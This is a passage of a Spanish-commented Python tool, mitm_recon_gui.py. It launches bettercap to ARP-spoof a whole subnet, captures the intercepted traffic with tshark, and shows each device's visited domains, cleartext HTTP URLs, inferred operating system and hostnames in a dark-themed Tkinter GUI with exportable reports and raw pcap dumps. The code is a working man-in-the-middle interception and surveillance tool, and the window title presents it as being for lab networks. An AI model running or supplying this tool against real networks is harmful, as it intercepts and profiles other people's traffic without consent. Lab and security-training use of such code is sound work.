            self.ingest_domain(mac_key, ip, dns_qry, ts)
        elif dns_qry and dns_resp == "1" and "." not in dns_qry:
            # Típico de una respuesta LLMNR: nombre corto sin dominio.
            self.handle_llmnr_response(mac_key, dns_qry, ts)
        elif tls_type == "1" and sni:
            self.ingest_domain(mac_key, ip, sni, ts)
        elif host:
            self.ingest_domain(mac_key, ip, host, ts)

    # ---- alias / nombres de dispositivo -----------------------------
    def set_alias(self, mac_key, name):
        with self.lock:
            name = name.strip()
            if name:
                self.aliases[mac_key] = name
            else:
                self.aliases.pop(mac_key, None)
            self._save_aliases()

    def get_label(self, mac_key):
        alias = self.aliases.get(mac_key)
        if alias:
            return alias
        device = self.devices.get(mac_key)
        if device and device.get("current_ip"):
            return device["current_ip"]
        if mac_key.startswith("ip:"):
            return mac_key[3:]
        return mac_key

    def _save_aliases(self):
        if not self.aliases_path:
            return
        try:
            with open(self.aliases_path, "w", encoding="utf-8") as f:
                json.dump(self.aliases, f, ensure_ascii=False, indent=2)
        except Exception:
            pass

    # ---- snapshots para la GUI (thread-safe) --------------------------
    def devices_snapshot(self):
        with self.lock:
            now = time.time()
            rows = []
            for mac_key, d in self.devices.items():
                top = sorted(d["activity"].items(), key=lambda kv: -kv[1]["hits"])[:3]
                top_str = ", ".join(f"{k.split('|', 1)[1]}({v['hits']})" for k, v in top) or "-"
                total_hits = sum(v["hits"] for v in d["activity"].values())
                age = now - (d["last_seen"] or now)
                os_str = f"{d['os_guess']} ({d['os_confidence']})" if d["os_guess"] else "?"
                rows.append({
                    "mac": mac_key,
                    "label": self.get_label(mac_key),
                    "ip": d["current_ip"] or "-",
                    "vendor": d["vendor_oui"] or "-",
                    "os": os_str,
                    "os_guess_raw": d["os_guess"],
                    "top": top_str,
                    "unmatched": len(d["unmatched_domains"]),
                    "age": age,
                    "total_hits": total_hits,
                })

            def sort_key(row):
                ip = row["ip"]
                if ip != "-":
                    try:
                        if is_private(ip):
                            return (0, ipaddress.ip_address(ip))
                    except ValueError:
                        pass
                return (1, row["mac"])

            rows.sort(key=sort_key)
            return rows

    def feed_snapshot(self, mac_filter=None, limit=300):
        with self.lock:
            items = list(self.feed)
        if mac_filter:
            items = [f for f in items if f[1] == mac_filter]
        return items[-limit:][::-1]

    def device_detail_text(self, mac_key):
        with self.lock:
            d = self.devices.get(mac_key)
            if not d:
                return "(sin datos para este dispositivo)"
            lines = []
            if mac_key.startswith("ip:"):
                lines.append("MAC: (todavía no resuelta — identificado solo por IP)")
            else:
                lines.append(f"MAC: {mac_key}")
            lines.append(f"IP actual: {d['current_ip'] or '-'}")
            if len(d["ips"]) > 1:
                lines.append(f"IPs históricas: {', '.join(sorted(d['ips']))}")
            lines.append(f"Fabricante (MAC-OUI): {d['vendor_oui'] or 'desconocido'}")
            if d["hostname"]:
                lines.append(f"Hostname detectado: {d['hostname']}  (origen: {d['hostname_source']})")
            if d["dhcp_vendor_class"]:
                lines.append(f"DHCP vendor class: {d['dhcp_vendor_class']}")
            conf = f" (confianza: {d['os_confidence']})" if d["os_guess"] else ""
            lines.append(f"SO inferido: {d['os_guess'] or 'desconocido'}{conf}")

            if d["os_signals"]:
                lines.append("")
                lines.append("Evidencia usada para inferir el SO:")
                for sig in d["os_signals"]:
                    lines.append(f"  - {sig['text']}")

            lines.append("")
            lines.append("Historial de cambios:")
            if d["change_log"]:
                for ch in d["change_log"][-50:][::-1]:
                    hhmmss = datetime.fromtimestamp(ch["ts"]).strftime("%H:%M:%S")
                    lines.append(f"  [{hhmmss}] {ch['type']}: {ch['detail']}")
            else:
                lines.append("  (sin cambios registrados todavía)")
            return "\n".join(lines)

    def final_report_text(self, enrich_unknown=0):
        with self.lock:
            lines = ["=" * 100, "REPORTE FINAL DE ACTIVIDAD POR DISPOSITIVO", "=" * 100]
            for mac_key, d in sorted(self.devices.items(), key=lambda kv: self.get_label(kv[0])):
                lines.append(f"\n### {self.get_label(mac_key)}")
                if not mac_key.startswith("ip:"):
                    lines.append(f"  MAC: {mac_key}  |  Fabricante: {d['vendor_oui'] or 'desconocido'}")
                lines.append(f"  IP actual: {d['current_ip'] or '-'}"
                              + (f"  |  IPs históricas: {', '.join(sorted(d['ips']))}" if len(d["ips"]) > 1 else ""))
                if d["hostname"]:
                    lines.append(f"  Hostname: {d['hostname']} (origen: {d['hostname_source']})")
                conf = f" (confianza: {d['os_confidence']})" if d["os_guess"] else ""
                lines.append(f"  SO inferido: {d['os_guess'] or 'desconocido'}{conf}")
                for sig in d["os_signals"]:
                    lines.append(f"    evidencia: {sig['text']}")

                by_cat = defaultdict(list)
                for key, v in d["activity"].items():
                    cat, service = key.split("|", 1)
                    by_cat[cat].append((service, v))
                for cat in sorted(by_cat):
                    lines.append(f"  {cat}:")
                    for service, v in sorted(by_cat[cat], key=lambda x: -x[1]["hits"]):
                        first_s = datetime.fromtimestamp(v["first"]).strftime("%H:%M:%S") if v["first"] else "?"
                        last_s = datetime.fromtimestamp(v["last"]).strftime("%H:%M:%S") if v["last"] else "?"
                        lines.append(f"    - {service:<20} {v['hits']:>4} hits  "
                                      f"(primero: {first_s}, último: {last_s})")

                if d["http_urls"]:
                    lines.append("  URLs completas vistas en claro (HTTP, no HTTPS):")
                    for ts, url in sorted(d["http_urls"])[:20]:
                        hhmmss = datetime.fromtimestamp(ts).strftime("%H:%M:%S")
                        lines.append(f"    [{hhmmss}] {url}")

                if d["unmatched_domains"]:
                    lines.append("  Dominios sin catalogar (top por frecuencia):")
                    for i, (domain, count) in enumerate(d["unmatched_domains"].most_common(15)):
                        org = enrich_domain(domain) if i < enrich_unknown else None
                        extra = f"  (org: {org})" if org else ""
                        lines.append(f"    - {domain:<50} {count} hits{extra}")

                if d["change_log"]:
                    lines.append("  Historial de cambios:")
                    for ch in d["change_log"]:
                        hhmmss = datetime.fromtimestamp(ch["ts"]).strftime("%H:%M:%S")
                        lines.append(f"    [{hhmmss}] {ch['type']}: {ch['detail']}")
            return "\n".join(lines)

    def export_json(self, path):
        with self.lock:
            data = {"devices": {}}
            for mac_key, d in self.devices.items():
                data["devices"][mac_key] = {
                    "label": self.get_label(mac_key),
                    "current_ip": d["current_ip"],
                    "ip_history": sorted(d["ips"]),
                    "vendor_oui": d["vendor_oui"],
                    "hostname": d["hostname"],
                    "hostname_source": d["hostname_source"],
                    "dhcp_vendor_class": d["dhcp_vendor_class"],
                    "os_guess": d["os_guess"],
                    "os_confidence": d["os_confidence"],
                    "os_evidence": [s["text"] for s in d["os_signals"]],
                    "change_log": d["change_log"],
                    "services": {k: v for k, v in d["activity"].items()},
                    "unmatched_domains": dict(d["unmatched_domains"]),
                    "http_urls": d["http_urls"],
                }
        with open(path, "w", encoding="utf-8") as f:
            json.dump(data, f, ensure_ascii=False, indent=2, default=str)


# ===========================================================================
# PARTE 3: Control de bettercap (ARP spoofing de subred completa)
# ===========================================================================

def require_root():
    if os.geteuid() != 0:
        sys.exit("[!] Este script necesita privilegios root (ARP spoofing + captura en vivo).\n"
                  "    Corre con: sudo python3 mitm_recon_gui.py ...")


def require_binaries(need_bettercap=True):
    needed = ["tshark"] + (["bettercap"] if need_bettercap else [])
    missing = [b for b in needed if not shutil.which(b)]
    if missing:
        sys.exit(f"[!] Faltan binarios en PATH: {', '.join(missing)}")


def detect_subnet(iface):
    try:
        out = subprocess.run(["ip", "-4", "addr", "show", "dev", iface],
                              capture_output=True, text=True, check=True).stdout
    except Exception as e:
        sys.exit(f"[!] No pude leer la IP de {iface}: {e}")
    m = re.search(r"inet (\d+\.\d+\.\d+\.\d+)/(\d+)", out)
    if not m:
        sys.exit(f"[!] No encontré una IPv4 asignada en la interfaz {iface}. "
                  f"Especifica la subred manualmente con --subnet.")
    ip_str, prefix = m.group(1), m.group(2)
    net = ipaddress.ip_interface(f"{ip_str}/{prefix}").network
    return str(net)


class BettercapController:
    STARTED_PATTERN = re.compile(r"arp spoofer started", re.I)
    ERROR_PATTERN = re.compile(r"\[err\]|panic|permission denied", re.I)

    def __init__(self, iface, subnet, log_path=None):
        self.iface = iface
        self.subnet = subnet
        self.proc = None
        self.started_event = threading.Event()
        self.error_lines = []
        self.log_path = log_path
        self._log_file = open(log_path, "w") if log_path else None

    def start(self):
        eval_cmd = (
            f"net.probe on; "
            f"set arp.spoof.targets {self.subnet}; "
            f"set arp.spoof.fullduplex true; "
            f"arp.spoof on"
        )
        cmd = ["bettercap", "-iface", self.iface, "-eval", eval_cmd]
        self.proc = subprocess.Popen(
            cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT,
            bufsize=1, universal_newlines=True
        )
        t = threading.Thread(target=self._reader_loop, daemon=True)
        t.start()
        return t

    def _reader_loop(self):
        for line in self.proc.stdout:
            if self.log_path:
                self._log_file.write(line)
                self._log_file.flush()
            if self.STARTED_PATTERN.search(line):
                self.started_event.set()
            if self.ERROR_PATTERN.search(line):
                self.error_lines.append(line.strip())

    def wait_until_active(self, timeout=15):
        return self.started_event.wait(timeout=timeout)

    def stop(self):
        if not self.proc or self.proc.poll() is not None:
            return
        self.proc.send_signal(signal.SIGINT)
        try:
            self.proc.wait(timeout=8)
        except subprocess.TimeoutExpired:
            self.proc.terminate()
            try:
                self.proc.wait(timeout=3)
            except subprocess.TimeoutExpired:
                self.proc.kill()
        if self._log_file:
            self._log_file.close()


def run_tshark_analysis(iface, capture_filter, active_fields):
    cmd = ["tshark", "-i", iface, "-l", "-n",
           "-f", capture_filter, "-T", "fields", "-E", "separator=\t",
           "-E", "occurrence=f"]
    for f in active_fields:
        cmd += ["-e", f]
    return subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE,
                             bufsize=1, universal_newlines=True)


def run_tshark_pcap_writer(iface, capture_filter, pcap_path):
    cmd = ["tshark", "-i", iface, "-n", "-f", capture_filter, "-w", pcap_path]
    return subprocess.Popen(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)


# ===========================================================================
# PARTE 4: GUI (Tkinter) — tema oscuro + grafo de topología
# ===========================================================================

PALETTE = {
    "bg": "#0b0f14",
    "panel": "#111722",
    "panel_alt": "#1a2230",
    "fg": "#c9d1d9",
    "accent": "#39d2c0",
    "accent2": "#ffb454",
    "muted": "#4b5563",
    "select": "#1f6f66",
}


def os_family_color(os_guess_raw):
    if not os_guess_raw:
        return "#4b5563"
    g = os_guess_raw.lower()
    if "android" in g:
        return "#8bd450"
    if "ios" in g or "macos" in g or "apple" in g:
        return "#5ac8fa"
    if "windows" in g:
        return "#39c2ff"
    if any(k in g for k in ("linux", "manjaro", "arch", "ubuntu", "debian", "raspberry", "fedora")):
        return "#ffb454"
    if "infraestructura" in g or "router" in g:
        return "#9aa0a6"
    return "#c084fc"


def _ip_sort_key(ip):
    if not ip or ip == "-":
        return (2, 0)
    try:
        return (0, int(ipaddress.ip_address(ip)))
    except ValueError:
        return (1, 0)


# Llave de orden por columna, operando sobre los dicts que devuelve
# ActivityStore.devices_snapshot() (valores crudos, no los ya formateados
# para mostrar, para que IP/edad/sin-catalogar ordenen numéricamente).
COLUMN_SORT_KEYS = {
    "label": lambda r: (r["label"] or "").lower(),
    "ip": lambda r: _ip_sort_key(r["ip"]),
    "vendor": lambda r: (r["vendor"] or "").lower(),
    "os": lambda r: (r["os_guess_raw"] or "").lower(),
    "top": lambda r: (r["top"] or "").lower(),
    "unmatched": lambda r: r["unmatched"],
    "age": lambda r: r["age"],
}


class ReconGUI:
    REFRESH_MS = 1200

    def __init__(self, root, store, status_banner, pcap_path, on_close):
        self.root = root
        self.store = store
        self.pcap_path = pcap_path
        self.on_close = on_close
        self.selected_mac = None
        self._active_sort_col = None
        self._sort_ascending = {}
        self._last_rows_by_mac = {}
        self._base_headers = {}

        self._apply_dark_theme(root)

        root.title("mitm_recon_gui — Trazabilidad de red de laboratorio")
        root.geometry("1460x760")
        root.protocol("WM_DELETE_WINDOW", self._handle_close)

        top = ttk.Frame(root, padding=6)
        top.pack(fill="x")
        ttk.Label(top, text=status_banner, font=("TkDefaultFont", 10, "bold"),
                  foreground=PALETTE["accent"]).pack(side="left")
        ttk.Label(top, text=f"Pcap: {pcap_path}" if pcap_path else "Pcap: desactivado").pack(side="right")

        main = ttk.Frame(root, padding=6)
        main.pack(fill="both", expand=True)

        # --- panel izquierdo: dispositivos + detalle ---
        left = ttk.Frame(main)
        left.pack(side="left", fill="both", padx=(0, 6))

        ttk.Label(left, text="Dispositivos", font=("TkDefaultFont", 11, "bold"),
                  foreground=PALETTE["accent"]).pack(anchor="w")

        columns = ("label", "ip", "vendor", "os", "top", "unmatched", "age")
        self.tree = ttk.Treeview(left, columns=columns, show="headings", height=16, selectmode="browse")
        headers = {"label": "Alias/IP", "ip": "IP actual", "vendor": "Fabricante",
                   "os": "SO inferido (confianza)", "top": "Top servicios",
                   "unmatched": "Sin catalogar", "age": "Últ. act."}
        widths = {"label": 150, "ip": 110, "vendor": 170, "os": 190,
                  "top": 220, "unmatched": 80, "age": 70}
        self._base_headers = headers
        for c in columns:
            self.tree.heading(c, text=headers[c], command=lambda col=c: self._sort_by_column(col))
            self.tree.column(c, width=widths[c], anchor="center" if c in ("unmatched", "age") else "w")
        self.tree.pack(fill="both", expand=True)
        self.tree.bind("<<TreeviewSelect>>", self._on_select_device)
        self.tree.bind("<Double-1>", lambda e: self._rename_selected())

        btns = ttk.Frame(left)
        btns.pack(fill="x", pady=6)
        ttk.Button(btns, text="Renombrar dispositivo", command=self._rename_selected).pack(side="left")
        ttk.Button(btns, text="Ver todos (quitar filtro)", command=self._clear_filter).pack(side="left", padx=4)

        ttk.Label(left, text="Detalle (SO inferido + historial de cambios)",
                  font=("TkDefaultFont", 10, "bold"), foreground=PALETTE["accent"]).pack(anchor="w", pady=(8, 0))
        self.detail_text = tk.Text(left, wrap="word", font=("monospace", 9), height=16,
                                    state="disabled", bg=PALETTE["panel"], fg=PALETTE["fg"],
                                    insertbackground=PALETTE["accent"], borderwidth=0, highlightthickness=1,
                                    highlightbackground=PALETTE["muted"], highlightcolor=PALETTE["accent"])
        self.detail_text.pack(fill="both", expand=True)

        # --- panel derecho: notebook con feed en vivo + topología ---
        right = ttk.Frame(main)
        right.pack(side="left", fill="both", expand=True)

        self.notebook = ttk.Notebook(right)
        self.notebook.pack(fill="both", expand=True)

        feed_tab = ttk.Frame(self.notebook)
        self.notebook.add(feed_tab, text="Feed en vivo")
        self.feed_title = ttk.Label(feed_tab, text="Todos los dispositivos",
                                     font=("TkDefaultFont", 10, "bold"), foreground=PALETTE["accent"])
        self.feed_title.pack(anchor="w")
        self.feed_text = tk.Text(feed_tab, wrap="none", font=("monospace", 9), state="disabled",
                                  bg=PALETTE["panel"], fg=PALETTE["fg"], insertbackground=PALETTE["accent"],
                                  borderwidth=0, highlightthickness=0)
        self.feed_text.pack(fill="both", expand=True)
        yscroll = ttk.Scrollbar(feed_tab, orient="vertical", command=self.feed_text.yview)
        yscroll.pack(side="right", fill="y")
        self.feed_text.configure(yscrollcommand=yscroll.set)

        graph_tab = ttk.Frame(self.notebook)
        self.notebook.add(graph_tab, text="Topología")
        self.graph_canvas = tk.Canvas(graph_tab, bg="#05070a", highlightthickness=0)
        self.graph_canvas.pack(fill="both", expand=True)
        self.graph_canvas.bind("<Button-1>", self._on_graph_click)

        bottom = ttk.Frame(root, padding=6)
        bottom.pack(fill="x")
        ttk.Button(bottom, text="Exportar reporte ahora", command=self._export_now).pack(side="left")
        ttk.Button(bottom, text="Detener y salir", command=self._handle_close).pack(side="right")

        self._refresh_loop()

    # -- tema oscuro --
    def _apply_dark_theme(self, root):
        p = PALETTE
        root.configure(bg=p["bg"])
        style = ttk.Style()
        try:
            style.theme_use("clam")
        except tk.TclError:
            pass
        style.configure(".", background=p["bg"], foreground=p["fg"],
                         fieldbackground=p["panel"])
        style.configure("TFrame", background=p["bg"])
        style.configure("TLabel", background=p["bg"], foreground=p["fg"])
        style.configure("TButton", background=p["panel_alt"], foreground=p["accent"], borderwidth=1)
        style.map("TButton", background=[("active", p["select"])])
        style.configure("Treeview", background=p["panel"], foreground=p["fg"],
                         fieldbackground=p["panel"], rowheight=22, borderwidth=0)
        style.configure("Treeview.Heading", background=p["panel_alt"], foreground=p["accent"],
                         relief="flat")
        style.map("Treeview", background=[("selected", p["select"])],
                  foreground=[("selected", "#05070a")])
        style.configure("TNotebook", background=p["bg"], borderwidth=0)
        style.configure("TNotebook.Tab", background=p["panel_alt"], foreground=p["fg"], padding=(12, 5))
        style.map("TNotebook.Tab", background=[("selected", p["panel"])],
                  foreground=[("selected", p["accent"])])
        style.configure("Vertical.TScrollbar", background=p["panel_alt"], troughcolor=p["bg"])

    # -- callbacks --
    def _on_select_device(self, _event):
        sel = self.tree.selection()
        if not sel:
            self.selected_mac = None
            return
        mac_key = sel[0]
        self.selected_mac = mac_key
        label = self.store.get_label(mac_key)
        self.feed_title.configure(text=label)
        self._refresh_detail()

    def _clear_filter(self):
        self.tree.selection_remove(self.tree.selection())
        self.selected_mac = None
        self.feed_title.configure(text="Todos los dispositivos")
        self._set_detail_text("Selecciona un dispositivo de la lista para ver su detalle.")

    def _on_graph_click(self, event):
        item = self.graph_canvas.find_closest(event.x, event.y)
        if not item:
            return
        tags = self.graph_canvas.gettags(item[0])
        for t in tags:
            if t != "node" and t in self.store.devices:
                self.tree.selection_set(t)
                self._on_select_device(None)
                break

    def _sort_by_column(self, col):
        ascending = not self._sort_ascending.get(col, False)
        self._active_sort_col = col
        self._sort_ascending[col] = ascending
        self._apply_sort()

    def _apply_sort(self):
        col = self._active_sort_col
        if not col or not self._last_rows_by_mac:
            return
        ascending = self._sort_ascending.get(col, True)
        key_func = COLUMN_SORT_KEYS[col]
        rows = list(self._last_rows_by_mac.values())
        rows.sort(key=key_func, reverse=not ascending)
        existing = set(self.tree.get_children())
        for idx, r in enumerate(rows):
            if r["mac"] in existing:
                self.tree.move(r["mac"], "", idx)
        self._update_header_arrows()

    def _update_header_arrows(self):
        for c, base in self._base_headers.items():
            if c == self._active_sort_col:
                arrow = " ▲" if self._sort_ascending.get(c, True) else " ▼"
                self.tree.heading(c, text=base + arrow)
            else:
                self.tree.heading(c, text=base)

    def _rename_selected(self):
        sel = self.tree.selection()
        if not sel:
            messagebox.showinfo("Renombrar", "Selecciona primero un dispositivo de la lista.")
            return
        mac_key = sel[0]
        current_alias = self.store.aliases.get(mac_key, "")
        new_name = simpledialog.askstring(
            "Renombrar dispositivo",
            f"Nombre/alias para {mac_key} (déjalo vacío para quitar el alias):",
            initialvalue=current_alias, parent=self.root)
        if new_name is not None:
            self.store.set_alias(mac_key, new_name)

    def _export_now(self):
        base = filedialog.asksaveasfilename(
            title="Exportar reporte como...", defaultextension=".txt",
            initialfile="reporte_actividad.txt",
            filetypes=[("Texto", "*.txt"), ("Todos", "*.*")])
        if not base:
            return
        try:
            with open(base, "w", encoding="utf-8") as f:
                f.write(self.store.final_report_text())
            json_path = os.path.splitext(base)[0] + ".json"
            self.store.export_json(json_path)
            messagebox.showinfo("Exportado", f"Reporte guardado en:\n{base}\n{json_path}")
        except Exception as e:
            messagebox.showerror("Error al exportar", str(e))

    def _handle_close(self):
        if messagebox.askyesno("Detener captura", "¿Detener la captura y salir? "
                                "Esto restaura las tablas ARP y guarda el reporte final."):
            self.on_close()
            self.root.destroy()

    # -- refresco periódico --
    def _refresh_loop(self):
        rows = self.store.devices_snapshot()
        self._refresh_devices(rows)
        self._refresh_feed()
        self._refresh_graph(rows)
        if self.selected_mac:
            self._refresh_detail()
        self.root.after(self.REFRESH_MS, self._refresh_loop)

    def _refresh_devices(self, rows):
        existing = set(self.tree.get_children())
        wanted = set()
        for r in rows:
            iid = r["mac"]
            wanted.add(iid)
            values = (r["label"], r["ip"], r["vendor"], r["os"], r["top"],
                      r["unmatched"], f"{r['age']:.0f}s")
            if iid in existing:
                self.tree.item(iid, values=values)
            else:
                self.tree.insert("", "end", iid=iid, values=values)
        for stale in existing - wanted:
            self.tree.delete(stale)
        self._last_rows_by_mac = {r["mac"]: r for r in rows}
        self._apply_sort()

    def _refresh_feed(self):
        items = self.store.feed_snapshot(mac_filter=self.selected_mac, limit=300)
        self.feed_text.configure(state="normal")
        self.feed_text.delete("1.0", "end")
        for ts, mac_key, ip, domain, label in items:
            hhmmss = datetime.fromtimestamp(ts).strftime("%H:%M:%S")
            tag = f"[{label}]" if label else "[sin catalogar]"
            dev_label = self.store.get_label(mac_key)
            self.feed_text.insert("end", f"[{hhmmss}] {dev_label:<24} -> {domain:<50} {tag}\n")
        self.feed_text.configure(state="disabled")

    def _refresh_graph(self, rows):
        c = self.graph_canvas
        c.delete("all")
        w = c.winfo_width() or 760
        h = c.winfo_height() or 560
        cx, cy = w / 2, h / 2

        c.create_oval(cx - 34, cy - 34, cx + 34, cy + 34, fill=PALETTE["accent2"], outline="")
        c.create_text(cx, cy, text="GATEWAY", fill="#05070a", font=("monospace", 9, "bold"))

        n = len(rows)
        if n == 0:
            c.create_text(cx, cy + 60, text="(todavía no hay dispositivos)",
                           fill=PALETTE["muted"], font=("monospace", 9))
            return

        radius = max(min(w, h) / 2 - 80, 60)
        max_hits = max((r["total_hits"] for r in rows), default=1) or 1

        for i, r in enumerate(rows):
            angle = 2 * math.pi * i / n - math.pi / 2
            x = cx + radius * math.cos(angle)
            y = cy + radius * math.sin(angle)
            width = 1 + 6 * (r["total_hits"] / max_hits)
            color = os_family_color(r["os_guess_raw"])

            c.create_line(cx, cy, x, y, fill=color, width=width)
            node_r = 16
            c.create_oval(x - node_r, y - node_r, x + node_r, y + node_r,
                          fill=color, outline=PALETTE["bg"], width=2, tags=("node", r["mac"]))
            c.create_text(x, y + node_r + 11, text=r["label"][:18],
                          fill=PALETTE["fg"], font=("monospace", 8), tags=("node", r["mac"]))

    def _refresh_detail(self):
        self._set_detail_text(self.store.device_detail_text(self.selected_mac))

    def _set_detail_text(self, text):
        self.detail_text.configure(state="normal")
        self.detail_text.delete("1.0", "end")
        self.detail_text.insert("end", text)
        self.detail_text.configure(state="disabled")


# ===========================================================================
# PARTE 5: hilo de captura (tshark -> ActivityStore), corre en background
# ===========================================================================

def capture_thread(proc, store, stop_event):
    while not stop_event.is_set():
        line = proc.stdout.readline()
        if not line:
            if proc.poll() is not None:
                break
            continue
        parts = line.rstrip("\n").split("\t")
        store.parse_line(parts)


# ===========================================================================
# PARTE 6: main
# ===========================================================================

def main():
    ap = argparse.ArgumentParser(description=__doc__,
                                  formatter_class=argparse.RawDescriptionHelpFormatter)
    ap.add_argument("-i", "--iface", required=True, help="Interfaz (eth0, wlan0, etc.)")
    ap.add_argument("--subnet", help="Subred CIDR a envenenar. Si se omite, se autodetecta.")
    ap.add_argument("--skip-arp-spoof", action="store_true",
                     help="No lanzar bettercap -- solo correr el análisis pasivo")
    ap.add_argument("--filter", default="ip or arp",
                     help="Filtro BPF de captura (default: 'ip or arp'; el 'or arp' es clave "
                          "para resolver MACs vía ARP)")
    ap.add_argument("--enrich-unknown", type=int, default=0, metavar="N")
    ap.add_argument("--include-internet", action="store_true")
    ap.add_argument("--bettercap-log", default="bettercap_output.log")
    ap.add_argument("--aliases", default="device_aliases.json",
                     help="JSON con alias de dispositivo, keyados por MAC")
    ap.add_argument("--oui-file", default=None,
                     help="Ruta a una lista MAC->fabricante (CSV oficial de IEEE o 'AABBCC,Nombre' "
                          "por línea) para ampliar la tabla embebida, que es solo ilustrativa")
    ap.add_argument("--no-pcap", action="store_true",
                     help="No guardar la captura cruda en disco (solo el análisis en vivo)")
    ap.add_argument("--pcap-out", default=None,
                     help="Ruta del .pcapng de salida (default: captura_YYYYmmdd_HHMMSS.pcapng)")
    args = ap.parse_args()

    require_root()
    require_binaries(need_bettercap=not args.skip_arp_spoof)

    active_fields = resolve_active_fields()

    bc = None
    status_banner = "ARP spoofing: DESACTIVADO (solo análisis pasivo)"
    if not args.skip_arp_spoof:
        subnet = args.subnet or detect_subnet(args.iface)
        bc = BettercapController(args.iface, subnet, log_path=args.bettercap_log)
        bc.start()
        if not bc.wait_until_active(timeout=15):
            bc.stop()
            sys.exit("[!] Abortando: no se confirmó que el ARP spoofing quedó activo. "
                      f"Revisa {args.bettercap_log}.")
        status_banner = f"ARP spoofing ACTIVO en {subnet}"
        time.sleep(1)

    pcap_path = None
    pcap_proc = None
    if not args.no_pcap:
        pcap_path = args.pcap_out or f"captura_{datetime.now().strftime('%Y%m%d_%H%M%S')}.pcapng"
        pcap_proc = run_tshark_pcap_writer(args.iface, args.filter, pcap_path)

    analysis_proc = run_tshark_analysis(args.iface, args.filter, active_fields)
    store = ActivityStore(private_only=not args.include_internet, aliases_path=args.aliases,
                           oui_file=args.oui_file, active_fields=active_fields)

    stop_event = threading.Event()
    cap_thread = threading.Thread(target=capture_thread, args=(analysis_proc, store, stop_event), daemon=True)
    cap_thread.start()

    def shutdown():
        stop_event.set()
        analysis_proc.terminate()
        try:
            analysis_proc.wait(timeout=3)
        except subprocess.TimeoutExpired:
            analysis_proc.kill()
        if pcap_proc:
            pcap_proc.send_signal(signal.SIGINT)
            try:
                pcap_proc.wait(timeout=5)
            except subprocess.TimeoutExpired:
                pcap_proc.terminate()
        if bc:
            bc.stop()
        report_path = f"reporte_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
        try:
            with open(report_path, "w", encoding="utf-8") as f:
                f.write(store.final_report_text(enrich_unknown=args.enrich_unknown))
            store.export_json(os.path.splitext(report_path)[0] + ".json")
            print(f"[+] Reporte final guardado en {report_path}")
        except Exception as e:
            print(f"[!] No se pudo guardar el reporte final: {e}")
        if pcap_path:
            print(f"[+] Captura cruda guardada en {pcap_path}")

    root = tk.Tk()
    ReconGUI(root, store, status_banner, pcap_path, on_close=shutdown)
    try:
        root.mainloop()
    except KeyboardInterrupt:
        shutdown()


if __name__ == "__main__":
    main()
